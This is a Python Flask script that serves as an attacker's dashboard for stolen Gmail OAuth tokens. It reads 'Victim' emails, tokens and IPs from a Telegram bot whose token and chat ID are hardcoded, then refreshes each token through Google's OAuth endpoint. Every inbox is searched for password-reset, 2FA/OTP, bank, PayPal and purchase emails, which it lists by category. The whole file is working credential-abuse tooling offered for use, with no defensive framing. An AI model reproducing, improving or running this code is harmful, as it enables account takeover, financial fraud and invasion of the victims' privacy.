#!/usr/bin/env python3
"""
web_viewer.py — Run on your LOCAL machine
Opens a browser UI at http://localhost:5001
Fetches tokens from Telegram
"""

from flask import Flask, render_template_string, request
import requests
import json
import base64
import webbrowser
import threading

app = Flask(__name__)

CLIENT_ID = "YOUR_CLIENT_ID.apps.googleusercontent.com"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Gmail Token Viewer</title>
    <style>
        body { font-family: Arial; padding: 30px; background: #0d1117; color: #c9d1d9; max-width: 800px; margin: auto; }
        h1 { color: #58a6ff; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; }
        th { color: #8b949e; }
        a { color: #58a6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .count { color: #8b949e; margin: 10px 0; }
        .btn { background: #238636; color: #fff; padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; }
        .btn:hover { background: #2ea043; }
    </style>
</head>
<body>
    <h1>📧 Gmail Token Viewer</h1>
    <p class="count">{{ count }} victim(s) found</p>
    <a href="/refresh" class="btn">🔄 Refresh from Telegram</a>
    <table>
        <tr><th>#</th><th>Email</th><th>IP</th><th>Action</th></tr>
        {% for email, info in tokens.items() %}
        <tr>
            <td>{{ loop.index }}</td>
            <td>{{ email }}</td>
            <td>{{ info.ip }}</td>
            <td><a href="/view/{{ email }}">View Inbox</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

INBOX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ email }} - Inbox</title>
    <style>
        body { font-family: Arial; padding: 30px; background: #0d1117; color: #c9d1d9; max-width: 1000px; margin: auto; }
        h2 { color: #58a6ff; }
        .back { color: #8b949e; }
        .msg { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin: 8px 0; }
        .from { color: #8b949e; font-size: 13px; }
        .subject { color: #c9d1d9; font-weight: 600; }
        .tag { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; margin-bottom: 6px; font-weight: bold; }
        .tag-red { background: #da3633; color: #fff; }
        .tag-blue { background: #1f6feb; color: #fff; }
        .tag-yellow { background: #d29922; color: #000; }
        .tag-green { background: #238636; color: #fff; }
        .empty { color: #8b949e; font-style: italic; text-align: center; padding: 40px; }
    </style>
</head>
<body>
    <a href="/" class="back">← Back to list</a>
    <h2>{{ email }}</h2>
    {% for kw, msgs in results.items() %}
        {% if msgs %}
        <h3 style="color:#8b949e; text-transform:uppercase; font-size:12px; letter-spacing:1px;">{{ kw }}</h3>
        {% for msg in msgs %}
        <div class="msg">
            <span class="tag tag-{{ msg.tag }}">{{ msg.tag_type }}</span>
            <div class="from">{{ msg.from }}</div>
            <div class="subject">{{ msg.subject }}</div>
        </div>
        {% endfor %}
        {% endif %}
    {% endfor %}
    {% if no_results %}
    <div class="empty">No interesting emails found.</div>
    {% endif %}
</body>
</html>
"""

tokens_cache = {}

def fetch_tokens():
    global tokens_cache
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/getUpdates"
    resp = requests.get(url)
    updates = resp.json().get("result", [])
    
    tokens = {}
    for upd in updates:
        text = upd.get("message", {}).get("text", "")
        if "[+]___ GMAIL_OAUTH ___[+]" in text:
            lines = text.split("\n")
            email = token = ip = "?"
            for line in lines:
                if line.startswith("Victim:"): email = line.split(": ", 1)[1].strip()
                if line.startswith("Token:"): token = line.split(": ", 1)[1].strip()
                if line.startswith("IP:"): ip = line.split(": ", 1)[1].strip()
            if email and token and email not in tokens:
                tokens[email] = {"token": token, "ip": ip}
    
    tokens_cache = tokens
    return tokens

def refresh_token(rt):
    r = requests.post("https://oauth2.googleapis.com/token", json={
        "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "refresh_token": rt, "grant_type": "refresh_token"
    })
    return r.json().get("access_token") if r.ok else None

def get_tag(kw):
    kw = kw.lower()
    if kw in ["password","reset","recover","verification","authenticator","2fa","otp"]:
        return ("red", "🔑 Password")
    if kw in ["bank","payment","paypal","venmo","credit","transfer","chase"]:
        return ("blue", "🏦 Bank")
    if kw in ["invoice","receipt","order","purchase","amazon"]:
        return ("green", "📄 Invoice")
    return ("yellow", "📌 Other")

@app.route('/')
def index():
    if not tokens_cache:
        fetch_tokens()
    return render_template_string(INDEX_HTML, tokens=tokens_cache, count=len(tokens_cache))

@app.route('/refresh')
def refresh():
    fetch_tokens()
    return render_template_string(INDEX_HTML, tokens=tokens_cache, count=len(tokens_cache))

@app.route('/view/<email>')
def view(email):
    if email not in tokens_cache:
        return "Token not found. Refresh the list.", 404
    
    at = refresh_token(tokens_cache[email]["token"])
    if not at:
        return "Token expired or invalid.", 400
    
    keywords = [
        "password", "reset", "verification", "otp", "2fa",
        "bank", "payment", "transfer", "paypal", "venmo",
        "invoice", "receipt", "order", "purchase",
        "login", "security", "alert", "confirm",
        "chase", "capital one", "amazon", "recover"
    ]
    
    results = {}
    no_results = True
    
    for kw in keywords:
        msgs = requests.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages?q={kw}&maxResults=5",
            headers={"Authorization": f"Bearer {at}"}
        ).json().get("messages", [])
        
        entries = []
        for m in msgs:
            d = requests.get(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{m['id']}",
                headers={"Authorization": f"Bearer {at}"}
            ).json()
            h = d["payload"]["headers"]
            subj = next((x['value'] for x in h if x['name']=='Subject'), 'No subject')
            fr = next((x['value'] for x in h if x['name']=='From'), 'Unknown')
            tag_cls, tag_name = get_tag(kw)
            entries.append({"subject": subj[:120], "from": fr[:80], "tag": tag_cls, "tag_type": tag_name})
            no_results = False
        
        if entries:
            results[kw] = entries
    
    return render_template_string(INBOX_HTML, email=email, results=results, no_results=no_results)

if __name__ == '__main__':
    print("[+] Opening browser at http://localhost:5001")
    webbrowser.open("http://localhost:5001")
    app.run(host="0.0.0.0", port=5001, debug=False)
